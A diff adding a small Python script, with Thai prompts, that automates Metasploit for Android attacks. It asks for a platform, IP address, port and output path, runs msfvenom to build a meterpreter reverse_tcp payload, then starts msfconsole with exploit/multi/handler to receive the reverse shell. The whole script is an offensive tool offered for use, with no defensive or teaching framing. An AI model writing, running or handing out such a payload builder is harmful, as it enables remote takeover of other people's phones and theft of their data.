@@ -1,0 +1,16 @@
+import os
+import time
+time.sleep (3)
+os.system ("clear")
+os.system ("cd /$HOME/msf/system;python3 progressbar.py")
+os.system ("clear")
+os.system (" neofetch --ascii_distro android --logo")
+system = input ("พิม android : ")
+ip = input ("ไอพ : ")
+port = input ("พอรท : ")
+out = input ("ทจดเกบ payload : ")
+os.system ("msfvenom -p %s/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s" % (system, ip, port, out))
+kuy = input ("พิม android : ")
+ip = input ("ไอพ : ")
+port = input ("พอรท : ")
+os.system ("msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD %s/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; exploit;'" % (kuy, ip, port,))
